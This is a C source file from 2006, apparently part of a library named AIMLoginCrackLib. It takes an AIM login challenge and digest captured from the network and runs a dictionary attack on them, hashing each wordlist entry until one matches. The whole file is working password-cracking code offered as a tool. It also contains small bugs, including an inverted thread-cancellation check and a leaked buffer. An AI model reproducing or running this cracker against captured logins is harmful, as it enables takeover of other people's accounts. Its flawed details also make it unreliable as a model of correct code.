/*
 *  AIMLoginCrack.c
 *  AIMLoginCrackLib
 *
 *  Created by Mischa Spiegelmock on 5/27/06.
 *  Copyright 2006 Mischa Spiegelmock. All rights reserved.
 *
 */


#include "AIMLoginCrack.h"

const u_char *CrackAIMLogin(const u_char *challenge, const u_char digest[16], const char *dictFile) 
{
	u_char *password = malloc(255 * sizeof(char));
	FILE *f;
	const char *fileName = dictFile;
	
	crackaim_auth_info_t auth = {challenge, digest};

	f = fopen(fileName, "r");
	
	if (!f) {
		printf("Could not open dictionary file %s\n", fileName); 
		exit(0);
	}
		
	unsigned long count = 0;
	while (fgets(password, 255, f)) {		
		// remove trailing "\n"
		unsigned int len = strlen(password);
		if (!len)
			continue;
		password[len-1] = '\0';
		
		if (CrackAIM_TestPassword(&auth, password)) {
			fclose(f);
			return password;
		}
		
		// make sure thread is not cancelled!
		if (count % 10000)
			pthread_testcancel();
		
		count++;
	}
	
	fclose(f);
	
	return NULL;
}

int CrackAIM_TestPassword(crackaim_auth_info_t *auth, const u_char *password) {
	MD5_CTX ctx;
	char digest[16];
	
	// md5 the pass
	MD5_CTX pass_ctx;
	char pass_md5[16];
	MD5Init(&pass_ctx);
	MD5Update(&pass_ctx, password, strlen(password));
	MD5Final(pass_md5, &pass_ctx);
	
	MD5Init(&ctx);
	MD5Update(&ctx, auth->challenge, strlen(auth->challenge));
	MD5Update(&ctx, pass_md5, 16);
	MD5Update(&ctx, AIM_MD5_STRING, strlen(AIM_MD5_STRING));
	MD5Final(digest, &ctx);
	
	return !memcmp(digest, auth->digest, 16);
}
